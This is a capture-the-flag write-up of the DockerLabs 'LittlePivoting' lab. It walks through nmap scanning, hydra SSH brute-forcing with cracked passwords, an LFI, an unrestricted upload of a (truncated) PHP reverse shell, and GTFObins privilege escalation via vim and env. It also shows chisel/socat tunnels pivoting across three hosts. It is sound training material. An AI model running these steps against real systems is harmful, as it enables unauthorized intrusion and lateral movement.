# LittlePivoting

<center><img src="https://dockerlabs.es/static/images/logos/logo.png" width="150px"></center>

## Contents

- [Reconnaissance](#reconnaissance)
- [Scanning (trust)](#scanning-trust)
- [Enumeration (trust)](#enumeration-trust)
- [Exploitation (trust)](#exploitation-trust)
- [Privilege Escalation (trust)](#privilege-escalation-trust)
- [Tunneling (trust -> kali)](#tunneling-trust---kali)
- [Scanning (inclusion)](#scanning-inclusion)
- [Enumeration (inclusion)](#enumeration-inclusion)
- [Exploitation (inclusion)](#exploitation-inclusion)
- [Tunneling (inclusion -> kali)](#tunneling-inclusion---kali)
- [Enumeration (upload)](#enumeration-upload)
- [Exploitation (upload)](#exploitation-upload)
- [Tunneling (upload -> inclusion -> trust -> kali)](#tunneling-upload---inclusion---trust---kali)
- [Privilege Escalation (upload)](#privilege-escalation-upload)

## Reconnaissance

The target machines are properly deployed within the lab network (in this case using Docker).

![Reconnaissance](https://i.imgur.com/mgJb6qY.png)

![Reconnaissance](https://i.imgur.com/XcNbbPV.png)

`arp-scan` was used on the docker-generated interface to identify devices connected locally. This revealed an available host with IP `10.10.10.2`.

```bash
> sudo arp-scan -I br-dcb58c6fa435 --localnet
Interface: br-dcb58c6fa435, type: EN10MB, MAC: 02:42:f4:9f:36:7b, IPv4: 10.10.10.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.2	02:42:0a:0a:0a:02	(Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 1 responded
```

## Scanning **trust**

An **Nmap** scan was performed to identify open ports and services on the **trust** machine:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 10.10.10.2
```

Main results:

```
# Nmap scan report for 10.10.10.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

## Enumeration **trust**

The website on port **80** was inspected and a discovery run with Gobuster was performed.

```bash
gobuster dir -u "http://10.10.10.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php.bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html          (Status: 200) [Size: 10701]
/secret.php          (Status: 200) [Size: 927]
/server-status       (Status: 403) [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

The `secret.php` page returned information about a possible user named **mario**.

![Scan1](https://i.imgur.com/zwXv23k.png)

With no further obvious information, a brute-force SSH attack using **hydra** was performed against user `mario`, which succeeded.

```bash
> hydra -t 4 -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 11:21:58
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 11:22:23
```

## Exploitation **trust**

Using the obtained credentials, an SSH connection to the target was established.

![SSH Access](https://i.imgur.com/BxtqCua.png)

## Privilege Escalation **trust**

The environment was analyzed to determine privilege escalation paths. SUID binaries were searched:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/grvujc8.png)

Because `/usr/bin/vim` was available to run with sudo, GTFObins was consulted for `vim` privilege escalation (`:!/bin/sh`), which provided a root shell.

![SUID](https://i.imgur.com/kttYaL3.png)

After obtaining root, a reconnaissance with `hostname -I` was run to discover other hosts on the network:

```bash
hostname -I
10.10.10.2 20.20.20.2
```

A small host scanning script was created to probe three-octet prefixes and was deployed on the trust machine to assist discovery. Additionally, `chisel` and `socat` were used to build tunnels and forward traffic between hosts.

**hostScanner.sh**

```bash
#!/bin/bash

if [ -z "$1" ]; then
	echo "Use: $0 <prefix>"
	echo "Sample: $0 20.20.20"
fi

PREFIX=$1

for host in $(seq 1 200); do
	timeout 1 bash -c "ping -c 1 ${PREFIX}.$host &>/dev/null" \ && echo "🐾 HOST FOUND - ${PREFIX}.$host"
done
wait
```

Note: make the script executable on the victim with `chmod +x`.

![Host Scanner](https://i.imgur.com/7v8BUdK.png)

There was a small issue where `ping` was not found; installing `iputils-ping` or `inetutils-ping` solved it:

```bash
sudo apt install iputils-ping
```

Running the scanner found additional hosts:

```bash
./hostScanner.sh 20.20.20
🐾 HOST FOUND - 20.20.20.2
🐾 HOST FOUND - 20.20.20.3
```

![Hosts Found](https://i.imgur.com/MN4R7hG.png)

### Tunneling (trust -> kali)

After identifying another host from trust’s network, a tunnel was created to reach that second machine from the attacker:

- Kali ran a `chisel` server listening on port **3434**.
  ![Chisel Server](https://i.imgur.com/PoLSGlm.png)

- `trust` ran a `chisel client` to the attacker server, exposing a local SOCKS proxy that allowed reaching `inclusion` (`20.20.20.3`) via `proxychains`.
  ![Chisel Client](https://i.imgur.com/pwDirmh.png)

- `proxychains4.conf` was configured to use `127.0.0.1 1080` in `strict_chain`.
  ![Proxychains Config](https://i.imgur.com/nWspCI4.png)

- `socat` was used on the intermediate host `trust` to forward connections to the attacker’s port **3434**.
  ![Socat Forward](https://i.imgur.com/G2q5tfG.png)

## Scanning **inclusion**

An Nmap scan was attempted through the proxychains SOCKS proxy; the host appeared up but port enumeration failed initially.

![Proxy Scan](https://i.imgur.com/XitUA6D.png)

After configuring a proxy in the browser, HTTP access worked and an Apache server was found.

![Inclusion Web](https://i.imgur.com/tNcKhct.png)
![Inclusion Web](https://i.imgur.com/XELdenf.png)

## Enumeration **inclusion**

`dirb` was used to quickly enumerate the site and returned:

```bash
> proxychains4 dirb http://20.20.20.3 2>/dev/null

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Oct  8 15:48:30 2025
URL_BASE: http://20.20.20.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://20.20.20.3/ ----
+ http://20.20.20.3/index.html (CODE:200|SIZE:10701)
+ http://20.20.20.3/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://20.20.20.3/shop/

---- Entering directory: http://20.20.20.3/shop/ ----
+ http://20.20.20.3/shop/index.php (CODE:200|SIZE:1112)

-----------------
END_TIME: Wed Oct  8 15:48:37 2025
DOWNLOADED: 9224 - FOUND: 3
```

The `/shop` page contained a parameter vulnerable to **Local File Inclusion (LFI)** and was fuzzed with `wfuzz` to identify inclusion vectors.

![Shop](https://i.imgur.com/YjOZ0Kb.png)

```bash
> proxychains wfuzz -u 'http://20.20.20.3/shop/index.php?archivo=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

![Wfuzz](https://i.imgur.com/Y1yVo4n.png)
![Wfuzz](https://i.imgur.com/KRXf5xo.png)

## Exploitation **inclusion**

After several attempts, the vulnerability was successfully exploited to reveal a list of users.

![Shop Users](https://i.imgur.com/PJRUPyI.png)

Next, `hydra` was used to brute-force SSH passwords for users like `manchi` or `seller` to gain SSH access.

```bash
> proxychains hydra -t 4 -l manchi -P /usr/share/wordlists/rockyou.txt ssh://20.20.20.3
```

The brute force found valid credentials:

```
[22][ssh] host: 20.20.20.3   login: manchi   password: lovely
```

SSH access to `20.20.20.3` using `proxychains` was then established.

![Inclusion SSH](https://i.imgur.com/1djhJld.png)

### Tunneling (inclusion -> kali)

- From `inclusion` (user `manchi`) `hostname -I` revealed additional hosts; the hostScanner script was used to discover `upload`.

```bash
hostname -I
20.20.20.2 30.30.30.2
```

```bash
./hostScanner.sh 30.30.30
🐾 HOST FOUND - 30.30.30.2
🐾 HOST FOUND - 30.30.30.3
```

- `chisel client` was run to forward traffic through `trust` using `socat` on port **1111**, which in turn tunneled to the attacker Kali that listens on **8090**, allowing the attacker to reach `upload`.
  ![Chisel Tunnel](https://i.imgur.com/U6Jd44l.png)

- The `chisel` server on Kali listened for incoming client connections.
  ![Chisel Server Kali](https://i.imgur.com/zDrJBG3.png)

- `127.0.0.1 8090` was added to proxychains and `dynamic_chain` was used.

## Scanning **upload**

An Nmap scan against the new host `30.30.30.3` did not return initial port results, but the host was reachable.

## Enumeration **upload**

HTTP access to `30.30.30.3` revealed a file upload interface and an indexable `/uploads` directory:

![Upload](https://i.imgur.com/13VxPFS.png)

`dirb` confirmed `/uploads/` is available and listable.

```bash
> proxychains dirb 'http://30.30.30.3' 2>/dev/null
```

![Dirb Upload](https://i.imgur.com/13VxPFS.png)

### Tunneling (upload -> inclusion -> trust -> kali)

To enable bidirectional communication from `upload` back to the attacker, `socat` was used to forward port **443** across the intermediate hosts so a reverse shell from `upload` could reach Kali:

- `inclusion` listened and forwarded port **443** towards `trust`.  
  ![Forward Inclusion](https://i.imgur.com/4WNcFKK.png)

- `trust` listened and forwarded port **443** towards the attacker machine.  
  ![Forward Trust](https://i.imgur.com/L944HFz.png)

## Exploitation **upload**

The `/uploads` page was vulnerable to an Unrestricted File Upload. Various webshells were tested (PHP, Python). The following script worked.

**reverse_shell_pentestmonkey.php**

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// (truncated here for brevity in the report — full script used during exploitation)
?>
```

The file was uploaded with the attacker's IP and port and then accessed from the `/uploads` directory to execute the reverse shell, which traversed the tunnels back to the attacker. Before triggering the webshell, a listener was started on the attacker:

```bash
sudo nc -nlvp 443
```

![Reverse Shell Listener](https://i.imgur.com/ufgP6nF.png)
![Reverse Shell Connected](https://i.imgur.com/G4Rh85z.png)

If all tunnels are properly in place, the reverse shell from `upload` reaches the attacker without issues.

## Privilege Escalation **upload**

Privilege escalation was achieved by finding binaries that the user could execute — `/usr/bin/env` was available and abused following GTFObins' guidance.

![Upload SUID](https://i.imgur.com/7GivQNZ.png)

This allowed compromising the final machine and obtaining root.

### Impact

Combining these vectors allowed full control of hosts and lateral movement across the lab topology. In a production environment, this would represent a **compromised chain of trust**, access to sensitive data and persistence capabilities.

---

_Written by **kur0bai**_
